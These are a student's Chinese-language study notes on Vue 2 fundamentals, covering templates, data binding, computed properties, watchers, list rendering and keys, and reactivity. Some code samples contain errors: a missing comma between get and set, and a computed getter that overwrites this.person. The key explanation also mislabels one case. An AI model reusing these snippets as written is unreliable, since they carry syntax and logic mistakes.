# 第一章：Vue 核心

Vue学到第八节我才用的markdown，之前七节直接在Vscode上写的，需要补充MVVM 数据代理 和 冒泡  这三个笔记写的不好

## 01_初始Vue

            1. 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象
            2. root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法
            3. root容器里的代码被称为Vue模板
            4. Vue实例和容器是一一对应的
            5. 真实开发中只有一个Vue实例，并且会配合着组件一起使用
            6. {{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性
            7. 一旦data中的数据发生改变，那么模板中用到该数据的地方也会自动更新

* 注意区分 JS表达式 和 JS代码(语句)

  1. 一个表达式会生成一个值，可以放在任何一个需要值的地方（左边可以放一个左值被赋值）JS表达式是一种特殊的JS代码：

     ​          (1)a

     ​          (2)a+b

     ​          (3)demo(1)函数调用表达式

     ​          (4)x === y ? 'a' : 'b'

  2. JS代码（语句）不生成值，只控制程序走向

     ​          (1) if(){}

     ​          (2) for(){}

## 02_模板语法

```html
<body>
    <!-- 
        Vue模板语法2大类：
            1.插值语法：
                功能：用于解析标签体内容（文本节点，innerHTML）
                写法：{{xxx}} xxx是js表达式，且可以直接读到data中的属性
            2. 指令语法：
                功能：用于解析标签（包括：标签属性，标签体内容，绑定事件......）
                举例：v-bind:href='xxx' 或 简写为 :href='xxx', xxx同样要写JS表达式，且可以直接读取到data中的所有属性
                备注：Vue中游很多的指令，且形式都是v-xxx，此处拿v-bind举例子

    -->
    <div id="root">
        <h1>插值语法</h1>
        <h3>你好,{{name}}</h3>
        <hr/>
        <h1>指令语法</h1>   
        <!-- 加了v-bind: 会把引号中的东西当成JS表达式执行，即读取url的变量 -->
        <!-- 可简写为冒号 -->
        <a v-bind:href="url">点我去尚硅谷学习1</a>
        <a :href="url">点我去尚硅谷学习2</a>
    </div>
</body>
```

## 03_数据绑定

```html
<body>
    <!-- 
        Vue有两种数据绑定的方式，
            1. 单项绑定(v-bind)：数据只能从data流向页面
            2. 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data
            备注：
            1. 双向绑定一般用于表单类元素（如Input和select）等
            2. v-model:value 可以简写为 v-model 因为v-model默认收集的就是value值
    -->
    <div id="root">
        单向数据绑定：<input type="text" v-bind:value="name">
        <br><br>
        双向数据绑定：<input type="text" v-model:value="name">
        <br><br>

        单向数据绑定简写：<input type="text" :value="age">
        <br><br>
        双向数据绑定简写：<input type="text" v-model="age">
        <br><br>

        <!-- 如下代码是错误的，因为 v-model只能应用于表单元素（输入类元素）上 
            如h2这种标题类的标签，数据不能输入也就是没有value值，既然model不能捕获用户的输入，也就不能影响数据的变化
        -->
        <h2 v-bind:x="name">你好呀</h2>
    </div>
</body>
```

## 04_el两种写法

```html
<body>
    <div id="root">
        <h1>你好，{{name}},{{age}}</h1>
    </div>
    <div id="root2">
        <h1>你好，{{name}},{{age}}</h1>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    //el的两种写法
    const v = new Vue({
        // el: '#root',
        data: {
            name: 'Tom',
            age: 18
        }
    })
    // v.$mount('#root')//和el的作用一样
    setTimeout(()=>{
        v.$mount('#root')//mount指挂载
    },1000)//等1秒钟再更新（使用更加灵活，因为可以指定不同的容器）
    console.log(v)//注意这里输出的是Vue实例对象，不是构造函数

    const u = new Vue({
        el: '#root2',
        //data的第一种写法：对象式写法
        // data: {
        //     name: 'Sue',
        //     age: 16
        // }
        //data的第二种写法：函数式 要求必须要返回函数
        // data:function(){
        data(){//一般没有用上面那一行写的data函数，因为麻烦
            //函数中的this是Vue实例对象，注意不能写成箭头函数，因为箭头函数没有自己的this，只能往外找，找到了全局（windows）函数
            console.log('@@@',this)
            return{
                name: 'Sue',
                age: 16
            }
        }
    })
</script>
<!-- 
    最重要的原则：由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了
        什么叫由Vue管理的函数？如函数式的data函数
 -->
```

## 05_MVVM模型

```html
<body>
    <!-- View视图部分 -->
    <div id="root">
        <h1>学校名称：{{name}}</h1>
        <h1>学校地址：{{address}}</h1>
        <h1>测试一下：{{3+8}}</h1>
        <!-- vm中的所有方法dom都可以提取到 -->
        <h1>测试一下2：{{$options}}</h1>
        <!-- 包括Vue的原型对象中的方法也可以提取 -->
        <h1>测试一下3：{{$emit}}</h1>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({//ViewModel部分，把数据（model）和dom结构（View）做了一个连接
        el: '#root',
        data: {//Model部分
            name: 'HFUT',
            address: '合肥'
        }
    })
    console.log(vm)
</script>
<!-- 
    MVVM模型
        1. M 模型（Model）: data 中的数据
        2. V 视图（View）: 模板代码
        3. VM 视图模型（ViewModel）: Vue实例
    观察发现：
        1. data中所有的属性，最后都出现在了vm身上
        2. vm身上的所有属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用
 -->
```

## 06_数据代理

### Object.defineProperty

```javascript
Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                name: 'Tom'
            }
        })

        let number = 18;
        let person = {
            name: '张三',
            gender: '男',
            // age: number,
            // num: number
        }

        Object.defineProperty(person, 'age', {
            // value: 18,
            //在此方法中定义的属性不可以被枚举（遍历）
            // enumerable: true, //控制属性是否可以枚举，默认值是false
            // writable: true, //控制属性值是否可以被修改（在网页中），默认值是false
            // configurable: true, //控制属性是否可以被删除，默认值是false

            //当有人读取person的age属性时，get函数(getter)就会调用，且返回的就是age的值
            // get:function(){//get是属性名，function是属性值，合体起来的gat函数一般称为getter
            get(){
                console.log('There is someone reading age property now')
                return number
            },

            //当有人修改person的age属性时，set函数(setter)就会调用，且返回的就是age的值
            set(value){
                console.log('有人修改了age属性值，且属性是',value);
                number = value //如果不加这一行代码的话，在网页控制台修改了person.age的值但person中age的值仍未变（getter又让age重新被赋值）
            }
        })

        //Object.keys方法的功能是将传入对象的所有属性的属性名
        console.log(Object.keys(person))

        for (let key in person){
            console.log(person[key])
        }

        console.log(person)
```

### 何为数据代理

数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）

```javascript
let obj = {x:100};
    let obj2 = {y:200};

    Object.defineProperty(obj2, 'x', {
        get(){
            return obj.x;
        },
        set(value){
            obj.x = value;
        }
    })
    Vue.config.productionTip = false;
```

### Vue中的数据代理

```html
<body>
    <div id="root">
        <h2>学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>
</body>
<script type = 'text/javascript'>
    Vue.config.productionTip = false;

    let data = {//这里把data拿出去了是因为在全局函数中方便查看data
        name: 'Tom',
        address: '合肥'
    }

    const vm = new Vue({//注意这个粉色括号叫配置对象，叫options 即vm._data = options.data = data
        el: '#root',
        data
    })
    console.log(vm);
    /*
        数据代理：在vm中修改了data中的数据
        
                        ---------setter-------->
        vm中的name(vm.name)                      data.name(在配置对象中的name)
                        <--------getter---------
    */
</script>
```

## 07_事件处理

### 事件的基本使用

```html
<body>

    <div id="root">
        <h2>welcome to {{school}}</h2>
        <button v-on:click="showInfo">点我提示信息</button>
        <!-- 注意v-on:click的简写形式是@click -->
        <button @click="showInfo2">点我提示信息2</button>
        <!-- 当点击这个按钮时会调用名为showInfo的函数,注意这个函数必须在Vue的实例中体现！ -->
    </div>

    <script>
        Vue.config.productionTip = false;

        // function showInfo(){
        //     alert('hello')
        // }
        // 在原生JS中，点击按钮默认给你调函数
        /*
            function showInfo(event){
                console.log(event.target)
                event是拿到事件发生的目标，即按钮
            }
        */

        const vm = new Vue({
            el: '#root',
            data: {
                school: 'HFUT'
            },
            methods:{//对象里边配方法，直接写对象名(){},不需要function了
                showInfo(event,a,b,c,d){
                    console.log(event.target);
                    console.log(this);//this是vm，即VUE实例对象
                    //当showInfo是箭头函数时，即showInfo:(event)=>{console.log(this)}时
                    //this是全局函数(window)的this，因为要往外找this，所有被VUE管理的函数最好不要写成箭头函数
                    //箭头函数是创建在windows下边的，在vm中写相当于被vm调用了，所以箭头函数this是window，普通函数是vm
                    //匿名函数的this均为windows
                    console.log(a,b,c,d);
                },
                showInfo2(event){
                    console.log('第二个函数');
                }
            }
        })
    </script>
</body>
```

### 事件的修饰符

```html
<body>
    <!-- 
        Vue中的事件修饰符（和event的方法二选一写）
            1.prevent: 阻止默认事件（常用）
            2.stop 阻止事件冒泡，只能阻止上一层冒泡失效（常用）
            3.once 事件只触发一次（常用）
            4.capture 使用事件的捕获方式，在捕获阶段就执行命令
            5.self 只用event.target是当前操作的元素时才是触发事件
            6.passive 事件的默认行为是立即执行，无需等待事件回调执行完毕

            修饰符可以连着写且不分顺序

        捕获阶段是由外往内的，冒泡阶段是由内往外（执行阶段）
    -->
    <div id="root" @click.stop="showInfo">
        <h2>欢迎来到{{name}}学习</h2>
        <a href="http://www.baidu.com" @click.prevent="showInfo">点我提示信息prevent</a>
        <a href="http://www.baidu.com" @click.stop="showInfo">点我提示信息stop</a>

        <!-- 注意这个捕获事件加载了外层函数上 -->
        <div class="box1" @click.capture="showMsg(1)">
            div1
            <div class="box2" @click="showMsg(2)">
                div2
            </div>
        </div>

        <!-- self 以e.target为例-->
        <div @click.self="showTarget">
            <!-- 外层标签的函数不执行，因为这个函数执行除了满足点击外还需要一个条件即e.target必须是它本身，现在e.target是内层的标签 -->
            div1
            <div @click="showTarget">
                div2
            </div>
        </div>

        <!-- passive 这个先略过 -->


        <!-- 在@click后边安上.prevent 这个也可以阻止标签的默认行为 这个叫事件修饰符 -->
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false;
        new Vue({
            el: '#root',
            data: {
                name: 'Tom'
            },
            methods: {
                showInfo(e){
                    //prevent
                    e.preventDefault()//这个函数阻止标签的默认行为
                    //stop
                    e.stopPropagation()//
                    alert('同学你好！')
                },
                showMsg(num){
                    console.log(num)
                },
                showTarget(e){
                    console.log(e.target)
                }
            }
        })
    </script>
</body>
```

### 键盘事件

```html
<!-- 
    1. Vue中常用的别名
        回车enter
        删除delete(捕获“删除”和“退格键”)
        退出esc
        空格space
        换行tab （特殊，必须配合keydown使用，因为按键的默认功能是切走
        上up
        下down
        左left
        右right
        切换大小写caps-lock

    2. 系统修饰键（用法特殊）Ctrl Alt Shift Meta
        (1)配合keyup使用：按下修饰键的同时再按下其他键，随后释放其他键，事件才触发
        (2)配合keydown使用：正常触发事件
        

    3. Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名

    可以组合按键
 -->
<body>
    <div id='root'>
        <h2>{{name}},欢迎学习Vue</h2>
        <!-- keydown是按下触发 keyup是按完了触发 -->
        <!-- .enter也是按回车触发函数 这种叫按键的别名 -->
        <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo">
    </div>
</body>
<script type='text/javascript' src='../../js/vue.js'></script>
<script type='text/javascript'>
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            name: 'Tom'
        },
        methods:{
            showInfo(e){
                // if(e.keyCode !== 13) return //回车的按键号
                // console.log(e.target.value)
            }
        }
    })
</script>
```

## 08_计算属性

```html
<body>
    <div id='root'>
        姓：<input type="text" v-model="firstName"><br>
        名：<input type="text" v-model="lastName"><br>
        姓名：<span>{{fullName}}</span><br>
        姓名：<span>{{fullName}}</span><br>
        姓名：<span>{{fullName}}</span><br>
        姓名：<span>{{fullName}}</span><br>
        姓名：<span>{{fullName}}</span><br>

    </div>
</body>
<script type='text/javascript' src='../../js/vue.js'></script>
<script type='text/javascript'>
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            firstName:'张',
            lastName:'三',
        },
        computed: {
            fullName: {
                get(){
                    console.log("get被调用")
                    return this.firstName + '-' + this.lastName
                }
                set(value){
                    //要在计算属性中更改依赖值，需要写set函数 需要在set函数中改依赖属性的值
                    const arr = value.split('-')
                    this.firstName = arr[0]
                    this.lastName = arr[1]
                    // 注意set和get函数都是被Vue所管理的函数，不要写成箭头函数，那样this指的是windows了
                }
            }
        }
    })
</script>
```

* <div style="color: red; font-weight: bold; font-size: 20px;">data中的任何数据发生变化，vue模板都会重新解析一遍（那个#root div中的html代码），当解析到插值语法中的fullName函数的时候，会重新调一遍函数</div>
* 写在computed里边的属性叫计算属性，**强烈不建议把各种计算公式全部塞到插值语法中**
* get有什么作用：当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
* get什么时候调用？
  * 初次读取fullName时，所以html里边写的那么多遍只会调一遍getter
  * 所依赖的数据发生变化时（firstName和lastName)
* 相比于methods，computed有缓存，在不满足调用getter条件的时候会调取缓存，而methods会一遍一遍计算
* 即我要修改计算属性，同时也要改依赖属性 要在计算属性中更改依赖值，需要写set函数 需要在set函数中改依赖属性的值 
* **注意set和get函数都是被Vue所管理的函数，不要写成箭头函数，那样this指的是windows了，在计算属性中的this仍然是vm**
* 计算属性也是一种直接在vm中可以找到的属性，**当调用计算属性的时候，拿到get的返回值，然后放在vm身上，放置的名字叫fullName**

![image-20221008161903685](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221008161903685.png)

* 注意，fullName是计算得来的属性，不能在vm._data中找到

![image-20221008162555674](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221008162555674.png)

* 如果确定不通过计算属性改依赖属性，那么就可以把set删掉，同时省略get，如下写法:
  * 注意，在模板中（html）的插值语法此时fullName不能写成函数的形式，因为fullName这个**属性**的值就是这个函数的返回值
  * **在插值语法调用时，需要考虑清楚是data中的数据，还是methods中的方法，还是computed中的属性**

```html
姓名：<span>{{fullName}}</span><br>
...
computed: {
            fullName() {
                    console.log("简写")
                    return this.firstName + '-' + this.lastName
            }
        }
```



讲义：

1. 定义：要用的属性不存在，要通过**已有的属性**计算得来 注意这个属性必须定义在Vue里边，定义在Vue外边的属性改变不能触发计算属性的刷新
2. 原理：底层借助了Object.defineproperty方法提供的getter和setter方法
3. get函数什么时候执行？ 见上
4. 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便（可以用开发者工具看到计算的过程）
5. 备注：
   1. 计算属性最终出现在Vm上，直接读取使用即可
   2. 如果计算属性要被修改，那必须写set函数去相应修改，且set中要引起计算时依赖的数据发生变化

## 09_监视属性

* 插值语法不能写if 因为if是判断语句，不形成值，不叫表达式 需要写三目运算符，形成值
* 下面的写法不可以，因为在模板中的click只会找在vm中的方法

```html
<button @click="alert(1)">alert</button>
```

```html
<div id="root">
        <h2>today is a {{info}} day</h2>
        <button @click="changeWeather">change weather</button>
    </div>


    <script type='text/javascript' src='../../js/vue.js'></script>
    <script type='text/javascript'>
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            isHot: true,
        },
        computed: {
            info(){
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        methods: {
            changeWeather(){
                this.isHot = !this.isHot
            }
        },
        watch: {
            isHot: {
                immediate: true, //初始化时让handler调用一下
                //handler什么时候调用？当isHot被改的时候
                handler(newValue, oldValue){
                    console.log('isHot被修改了', newValue, oldValue)
                }
            },
            info: {
                immediate: true, //计算属性也可以监测到
                handler(newValue, oldValue){
                    console.log('info被修改了', newValue, oldValue)
                }
            }
        }
    })
    </script>
```

* 监视属性watch，当属性（包括计算属性）被调用的时候可以被执行
  * 通过handler调用，两个默认参数为改变后的值和改变前的值
  * immediate属性为初始化调用handler方法，其中oldValue为undefined
  * 计算属性也可以监视到
  * 也可以像下面代码这样写，注意属性需要加引号，键是默认要加引号的，只不过在vm中我们习惯把每个属性（键）的引号去掉

```javascript
vm.$watch('isHot', {
            immediate: true,
            handler(newValue, oldValue) {
                console.log('isHot被修改了', newValue, oldValue)
            }
        })
```

讲义：

1. 当被监视的属性变化时，回调函数自动调用，进行相关操作
2. **监视的属性必须存在，才能进行监视**
3. 监视的两种写法：
   1. new Vue 时传入watch配置
   2. 通过vm.$watch进行监视

### 深度监视

```
<h3>a's value is {{numbers.a}}</h3>
<button @click="numbers.a++">点我让a++</button>

data: {
                isHot: true,
                numbers: {
                    a: 1,
                    b: 1
                }
            }
            
watch: {
                isHot: {
                    immediate: true,
                    handler(newValue, oldValue) {
                        console.log('isHot被修改了', newValue, oldValue)
                    }
                },
                //监视多级结构中某个属性的变化
                'numbers.a': { //注意对象中的key是字符串，不能带. 所以必须要加上双引号
                    handler(n, o) {
                        console.log('a被改变了')
                    }
                }
            }
```

* 在监视多级结构中某个属性的变化需要找到变化的那个属性，不能直接监视上级
  * **注意，由于key是字符串，所以加.不能被识别为键，需要手动加双引号了**
* 当监视numbers时
  * **numbers相当于data里边的key，它的value是花括号的地址值，即监视的是value的地址**
  * 因为改变里边键的值（a和b的值）不会让地址发生变化，所以上述写法不生效
  * 所以需要在watch调用的多级结构属性中加上一个**deep: true**

```
//监视多级结构中所有属性的变化
                numbers: {
                    deep: true,
                    handler(n, o){
                        console.log('深度监测')
                    }
                }
```

* 请注意，Vue并不是没有监测到多级结构中属性没有变化，但是watch默认是不行的，需要加一个deep:true

讲义：

1. 深度监视：
   1. Vue中的watch默认不检测对象内部值的改变（一层）
   2. 配置deep:true 可以检测对象内部值的改变（多层）
2. 注：
   1. **Vue自身可以监测对象内部值的改变，但是Vue提供的watch默认不可以**
   2. 使用watch时可以根据数据的具体结构，决定是否采用深度监视

### 简写形式

```
watch: {
                //简写形式
                isHot(n, o) {
                    console.log("isHot被修改了",n, o)
                },
            }
vm.$watch('isHot', function(n, o){
            console.log('isHot被修改了', n, o ,this)
        })
```

* 简写形式就不能用immediate 和 deep了，而且注意$watch写法不能用箭头函数，因为this指向的是windows

### watch与computed比较

```
watch: {
            firstName(n, o){
                setTimeout(()=>{
                    this.fullName = n + '-' + this._data.lastName
                },1000)
                
            },
            lastName(n, o){
                this.fullName = this._data.firstName + '-' + n
            }
        }
computed: {
            fullName() {
                setTimeout(() => {
                    return this.firstName + '-' + this.lastName
                }, 1000)
                
            }
        }
```

* 注意，定时器的箭头函数不由vue管理，定时器到点是JS引擎帮你调的函数
  * **如果定时器的函数用普通函数，那么这个函数的this就是window了！**
  * 因为定时器提供的回调是由JS引擎调用的，this就已经给你指定好了就是window
  * **箭头函数没自己的this，往外找找到了watch属性的this，所以定时器箭头函数里边的this就是vm**

* 当某一个脑抽客户提出了计算属性延后变化的要求时，必须要用watch属性了
  * **注意，computed属性不能执行异步操作**
  * 因为watch属性不需要return就能修改data中的数据，而计算属性需要return出来的属性

讲义：

1. computed和watch之间的区别
   1. computed能完成的功能，watch都可以完成
   2. watch能完成的功能，computed不一定能完成，例如watch可以进行异步操作
2. 两个重要的小原则
   1. 所被Vue管理的函数，最好写成普通的函数，这样的this指向才是vm或组件实例对象
   2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等，promise的回调函数），最好写成箭头函数，这样this指向的才是vm或组件实例对象

## 10_绑定样式

* 注意两个class不能同时写在一个标签中

```html
<body>
    <div id="root">
        <!-- 绑定class样式，字符串写法，适用于：样式的类名不确定（:class的名），需要动态指定 -->
        <div class="basic" :class="mood" @click="changeMood"></div>

        <!-- 绑定class样式，数组写法，适用于：要绑定的样式个数不确定，名字也不确定 当然可以直接把数组塞到:class里边-->
        <div class="basic" :class="arrClass" @click="changeMood"></div>

        <!-- 绑定class样式，对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用-->
        <div class="basic" :class="objClass" @click="changeMood"></div>
        <div class="basic" :class="{'a': true, 'b': false}" @click="changeMood"></div>
        <div class="basic" :class="obj ? 'a' : 'b'" @click="changeMood"></div>

        <!-- 绑定style样式，注意由于写的是个对象，是键值对所以字符串键不能加-，值也是字符串 建议放到data里边-->
        <div id="class" :style="{fontSize: fsize+'px'}"></div>
        <div id="class" :style="{fontSize: obj ? fsize+'px' : fsize2+'px'}"></div>

        <!-- 绑定style样式，也可以写成数组-->
        <div id="class" :style="[styleObj1, styleObj2]">{{name}}</div>
        <div id="class" :style="[obj ? styleObj1 : styleObj2]">{{name}}</div>

    </div>
</body>
<script type='text/javascript' src='../../js/vue.js'></script>
<script type='text/javascript'>
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            name: 'Tom',
            mood: 'sad',
            arrClass: ['a', 'b', 'c'],
            objClass: {
                'a': false,
                'b': true
            },
            fsize: 30,
            objStyle1:{},
            objStyle2:{}
        },
        methods: {
            changeMood(){
                const arr = ['happy', 'sad', 'normal']
                const ran = Math.random() * 3 //注意random不包含1
                const index = Math.floor(ran) //向下取整
                this.mood = arr[index]
            }
        },
    })
</script>
```

## 11_条件渲染

```html
<template v-if="true">
            <h2>a</h2>
            <h2>a</h2>
            <h2>a</h2>
        </template>
```

* **template是可以在不破坏html结构的情况下给里边的标签批量加v-if的 即在渲染页面的时候template不会出现，只会把v-if给子节点**
  * **注意，template只对v-if生效，不对v-show生效**

讲义：

条件渲染：

1. v-if 写法：

   1. v-if="表达式"
   2. v-else-if="表达式"
   3. v-else="表达式"

   适用于：切换频率比较低的场景

   **特点：不展示的DOM元素直接被移除**

   注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”

2. v-show

   写法：v-show="表达式"

   适用于：切换频率比较高的场景

   **特点：不展示的DOM元素未被移除**

3. 备注：使用v-if时，元素可能无法获取到，而使用v-show一定可以获取到

## 12_列表渲染

```html
<body>
    <div id="root">
        <ul>
            <li v-for="p in person" :key="p.id">
                姓名:{{p.name}}-年龄:{{p.age}}
            </li>
        </ul>
        <!-- 括号可以不加 in可以换成for -->
        <ul>
            <li v-for="(p,index) in person" :key="index">
                姓名:{{p.name}}-年龄:{{p.age}}
            </li>
        </ul>
        <!-- 列表渲染对象时，格式和输入如下 -->
        <ul>
            <li v-for="(value, key) in car" :key="">
                值：{{value}}-键：{{key}}
            </li>
        </ul>
        <!-- 列表渲染字符串，格式和输入如下 -->
        <ul>
            <li v-for="(char, index) of str" :key="index">
                单个字符：{{char}}-索引值：{{index}}
            </li>
        </ul>
        <!-- 列表渲染指定次数，格式和输入如下 -->
        <ul>
            <li v-for="(number, index) in 5">
                从1开始到5的数：{{number}}-索引值：{{index}}
            </li>
        </ul>
    </div>
</body>
<script type='text/javascript' src='../../js/vue.js'></script>
<script type='text/javascript'>
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            person: [{
                id: '001',
                name: '张三',
                age: 18
            }, {
                id: '002',
                name: '李四',
                age: 19
            }, {
                id: '003',
                name: '王五',
                age: 20
            }, ],
            car: {
                name: '奥迪A8',
                price: '70万',
                color: '黑色'
            },
            str: 'hello'
        }
    })
</script>
```

### key的作用与原理

* 控制台看不到:key的原因是vue把这个DOM自己用了

```
<li v-for="p, index in person" :key="index">
                姓名:{{p.name}}-年龄:{{p.age}}
                <input type="text">
            </li>
```

* 如果用的是列表的索引值，当在列表前添加一个新元素的时候，会出现input里边已经输入好的元素前挪一个

![image-20221009095054975](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221009095054975.png)

* <div style="color: red; font-weight: bold; font-size: 20px;">遍历列表时key的作用（面试常问）：</div>

  * 当index作为key时
    * 初始数据（列表），vue根据数据生成虚拟DOM
    * 在初始的虚拟DOM中，有key 我们管这个初始虚拟DOM叫Vnodes
    * 将虚拟DOM转换为真实的DOM，在页面上显示的就是真实的DOM  用户能接触到的也是页面上真实的DOM
    * 在渲染新的数据时（加入了老刘），vue会根据新的数据生成虚拟DOM
    * 新虚拟DOM(Vnodes)会和初始虚拟DOM(Vnodes)进行一个**虚拟DOM对比算法**
      * 在新的虚拟DOM中，取出了第一行（key=0），vue自动到初始的虚拟DOM中寻找key=0的那一行标签，进行内部html元素的对比
      * 发现新内容（老刘-30）和旧内容（张三-18）不一样
      * 再对比Input标签，注意始终对比的是虚拟DOM，在虚拟DOM中，input中没有信息（123），input中写入内容是在真实DOM中进行的。所以在标签名一样，标签结构一样，标签所有属性都一样，最终对比的结构就是一样的
    * 新虚拟DOM渲染时
      * 由于标签内的内容（老刘-30和张三-18）不一样，所以新内容是重新由新虚拟DOM转换为全新的真实DOM（显示老刘-30）
      * 由于新旧虚拟DOM中的input标签一样，所以input是直接拿的初始虚拟DOM页面渲染（**复用**）
      * 之后同理

![IMG_0044(20221009-115930)](D:\QQ下载和缓存\MobileFile\IMG_0044(20221009-115930).JPG)

* * 当index作为key时
    * 因为新的虚拟DOM第一行没有在初始虚拟DOM中找到对应的key，只能转换成真实DOM
    * 而且这样渲染页面效率更高，因为对应id新旧虚拟DOM一样，都复用了，没有上种情况需要重新转换真实DOM的情况
  * 如果遍历的时候不写Key，那么VUE会默认把遍历时候的索引值变成key
  * 如果把新加的元素放在数组后边，也不会出现上述问题（即使不写key）

<div style="color: red; font-weight: bold; font-size: 20px;">面试题：react、vue中的key有什么作用？（key的内部作用原理）</div>

1. 虚拟DOM中key的作用：
   1. key是虚拟DOM对象的标识，当状态中的数据发生变化时，Vue会根据**新数据**生成**新的虚拟DOM**
   2. 随后Vue进行**新虚拟DOM**与**旧虚拟DOM**的差异比较，比较规则如下：
2. 对比规则：
   1. 旧虚拟DOM中找到了与新虚拟DOM相同的key：
      1. 若虚拟DOM中内容没有变，直接使用之前的真实DOM
      2. 若虚拟DOM中内容改变了，则生成新的真实DOM，随后替换掉页面之前的真实DOM
   2. 旧虚拟DOM中未找到与新虚拟DOM相同的key
      1. 创建新的真实DOM，随后渲染到页面
   3. 用index作为Key可能会引发的问题：
      1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作：
         1. 会产生没有必要的真实DOM更新 ==> 界面效果没问题，但效率低
      2. 如果结构中还包含输入类DOM：
         1. 会产生错误的DOM更新 ===> 界面有问题
   4. 开发中如何选择key?
      1. 最好使用每条数据的唯一标识作为Key，比如id、手机号、身份证号等唯一值
      2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用Index作为key是没有问题的

**但凡是个合格的后端，给你传列表的时候一定每个对象都有一个唯一标识**

### 列表过滤

* 用watch写
  * 注意filter中return出来匹配条件的内容，而且返回一个新的数组
  * indexOf 匹配参数所在的索引，要是索引不存在返回-1
  * **indexOf中查询空字符串，返回的索引值是0**

```html
<body>
    <div id="root">
        <input type="text" placeholder="列表过滤" v-model="keyWord">
        <ul>
            <li v-for="p in personNew" :key="p.id">
                姓名:{{p.name}}-年龄:{{p.age}}-性别:{{p.gender}}
            </li>
        </ul>
    </div>
</body>
<script type='text/javascript' src='../../js/vue.js'></script>
<script type='text/javascript'>
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            keyWord: '',
            person: [{
                id: '001',
                name: '马冬梅',
                age: 18,
                gender: '女'
            }, {
                id: '002',
                name: '周冬雨',
                age: 19,
                gender: '女'
            }, {
                id: '003',
                name: '周杰伦',
                age: 20,
                gender: '女'
            }, {
                id: '004',
                name: '温兆伦',
                age: 21,
                gender: '女'
            }, ],
            personNew: []
        },
        watch: {
            keyWord:{
                immediate: true,
                handler(n){
                    this.personNew = this.person.filter((p) => { //注意filter中return出来匹配条件的内容，而且返回一个新的数组
                    // indexOf 匹配参数所在的索引，要是索引不存在返回-1
                    //特别注意，indexOf中查询空字符串，返回的索引值是0，所以能用immediate立即调用函数生效
                    return p.name.indexOf(n) !== -1
                })
                }
            }
        }
    })
</script>
```

* 计算属性(computed)实现
  * 注意计算属性中的依赖值（keyWord）改变的时候自然会更新一遍模板

```javascript
new Vue({
        el: '#root',
        data: {
            keyWord: '',
            person: [{
                id: '001',
                name: '马冬梅',
                age: 18,
                gender: '女'
            }, {
                id: '002',
                name: '周冬雨',
                age: 19,
                gender: '女'
            }, {
                id: '003',
                name: '周杰伦',
                age: 20,
                gender: '女'
            }, {
                id: '004',
                name: '温兆伦',
                age: 21,
                gender: '女'
            }, ]
        },
        computed: {
            personNew(){
                //两个return不一样，里边的return是filter规定的筛选条件，外边的return是计算属性返回值
                return this.person = this.person.filter((p) => {
                    return p.name.indexOf(this.keyWord) !== -1
                })
            }
        },
    })
```

### 列表排序

```
computed: {
            personNew(){
                const arr =  this.person.filter((p) => {
                    return p.name.indexOf(this.keyWord) !== -1
                })
                if(this.sortType){
                    //sort改变原数组
                    arr.sort((a, b) => {
                        //后减前降序 前减后升序
                        return this.sortType === 1 ? b.age - a.age : a.age - b.age 
                    })
                }
                return arr
            }
        },
```

![image-20221009144101981](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221009144101981.png)

## Vue监测数据的原理

**这一块本来是在列表渲染里边的，但是老师讲的太好我单独拿出来了**

![IMG_0047(20221009-153343)](D:\QQ下载和缓存\MobileFile\IMG_0047(20221009-153343).JPG)

* vue在拿到data后
  * 先进行加工，加工完毕就可以做**响应式** **(get和set)**  响应式指data变了，页面也跟着变了
  * 第二步将vm._data被赋值data(先这样理解)
  * **当改data里边的属性时**
    * **会调用对应set函数(set name) -> 重新解析模板 -> 会生成新的虚拟DOM -> 新旧DOM对比 -> 更新页面**

* 手动监视（data就是一个普通的对象）
  * Object.defineProperty 这样写会死循环，因为当data.name被读取时会调用get，但是return时候也在读取
  * 同理设置data.name也会变成死循环

![image-20221009155023953](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20221009155023953.png)

* * Observer 方法
  * this指的是observer的实例对象（obs）

```javascript
let data = {
        name: 'Tom'
    }

    //创建一个监视的实例对象，用于监视data中属性的变化
    const obs = new Observer(data)
    console.log(obs) 

    //准备一个vm实例对象
    let vm = {}
    vm._data = data = obs

    function Observer(obj){
        //汇总对象中所有的属性形成一个数组
        const keys = Object.keys(obj)
        //遍历
        keys.forEach((k) => {
            //这里边的this是Observer的实例对象(obs)
            Object.defineProperty(this, k, {
                get(){
                    return obj[k]
                },
                set(val){
                    console.log(`${k}被改了，我要去解析模板，生成虚拟DOM`)
                    obj[k] = val
                }
            })
        })
    }
```

* obs见下：

